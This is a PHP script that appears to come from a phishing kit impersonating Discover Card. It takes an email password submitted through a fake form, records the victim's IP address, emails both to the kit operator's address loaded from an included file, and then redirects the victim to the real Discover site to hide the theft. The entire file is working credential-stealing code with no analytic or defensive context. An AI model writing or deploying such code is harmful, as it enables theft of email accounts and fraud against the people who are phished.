<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$_SESSION['emailpass'] = $_POST['emailpass'];
$headers = "From: Discover_XSPTX<xsptx@lbox.com>\r\n" ;
$msg =
"------------ NEW Discover Card --------------------->



Yahoo Password         :".$_SESSION['emailpass']."



IP ADDRESS : $ip


+=+=+=+=+=+=+=+=+=## SP TX Discover ##+=+=+=+=+=+=+=+=+=+=+=+=";

include 'email.php';
$subj = " [Discover Card] Email Access Pass  - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
header("Location: https://card.discover.com");
?>